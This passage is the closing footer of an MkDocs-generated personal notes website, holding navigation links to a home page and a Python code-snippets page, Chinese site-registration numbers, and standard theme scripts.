              
              
                
              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid">
        
          <a href="../README/" title="Home" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
            </div>
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Previous
                </span>
                Home
              </span>
            </div>
          </a>
        
        
          <a href="../gist/" title="Gist Python一些常用代码片段" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Next
                </span>
                Gist Python一些常用代码片段
              </span>
            </div>
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
            </div>
          </a>
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
          <div class="md-footer-copyright__highlight">
            <a href=http://www.miitbeian.gov.cn/>浙ICP备15043819号-2</a>&nbsp;&nbsp;<a target=_blank href=http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=33010602007826><img src="/assets/images/beian.png" height=14px>浙公网安备 33010602007826号</p></a>
          </div>
        
        powered by
        <a href="http://www.mkdocs.org">MkDocs</a>
        and
        <a href="https://squidfunk.github.io/mkdocs-material/">
          Material for MkDocs</a>
      </div>
      
        
  <div class="md-footer-social">
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    
      <a href="https://github.com/zjuchenyuan" class="md-footer-social__link fa fa-github-alt"></a>
    
      <a href="mailto: py3io@zju.email" class="md-footer-social__link fa fa-envelope"></a>
    
  </div>

      
    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../assets/javascripts/application.f041762f.js"></script>
      
      <script>app.initialize({version:"0.17.2",url:{base:".."}})</script>
      
    
    
      
    
  </body>
</html>